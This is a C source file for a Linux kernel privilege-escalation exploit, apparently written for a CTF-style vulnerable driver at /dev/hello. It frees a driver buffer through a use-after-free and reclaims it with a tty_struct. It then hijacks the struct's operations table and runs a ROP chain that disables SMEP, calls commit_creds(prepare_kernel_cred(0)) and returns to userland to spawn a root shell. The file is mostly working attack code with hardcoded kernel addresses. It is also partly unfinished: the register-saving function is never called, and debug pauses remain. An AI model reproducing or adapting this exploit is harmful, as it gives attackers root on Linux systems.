#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <fcntl.h>

#define prepare_kernel_cred_addr 0xffffffff810bd944
#define commit_creds_addr 0xffffffff810bd56a

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

void get_shell()
{
    system("/bin/sh");
}

void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
size_t fuck_tty_struct[4] = {0};
size_t* fuck_tty_operations[35];


int main(){

	int i = 0;


	size_t rop[32] = {0};
	rop[i++] = 0xffffffff81521a97;      // pop rdi; ret;
	rop[i++] = 0x6f0;
	rop[i++] = 0xffffffff8101fb0d;      // mov cr4, rdi; ret;
	rop[i++] = (size_t)get_root;
	rop[i++] = 0xffffffff8106c717;      // swapgs; ret;
	rop[i++] = 0xffffffff81035a2b;      // iretq; ret
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;                /* saved CS */
	rop[i++] = user_rflags;            /* saved EFLAGS */
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	int fd1 = open("/dev/hello", 2);
	int fd2 = open("/dev/hello", 2);

	ioctl(fd1, 666, 0x2e0);

	close(fd1);

	int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	
	getchar();
    
	read(fd2, fuck_tty_struct, 32);	

	 for(int i = 0; i < 35; i++)
   	 {
        	fuck_tty_operations[i] = (size_t)&rop; 
   	 }
	getchar();
	//fuck_tty_operations[0] = 0xffffffff8291e91b;
//	fuck_tty_operations[0] = 0xffffffffffffffff;
	fuck_tty_operations[7] = 0xffffffff8291e91b;
	//fuck_tty_operations[7] = 0xffffffffc08170a4;	


	fuck_tty_struct[3] = (size_t)fuck_tty_operations;

	write(fd2, fuck_tty_struct, 32);

	printf("operations = %p r8 = %p, rop = %p, operations[1] = %p\n", fuck_tty_operations, fuck_tty_operations[0], rop, &fuck_tty_operations[1]);
	printf("stop!!!");
	getchar();
	
	write(fd_tty, rop, 0x8);

	getchar();

	return 0;
}
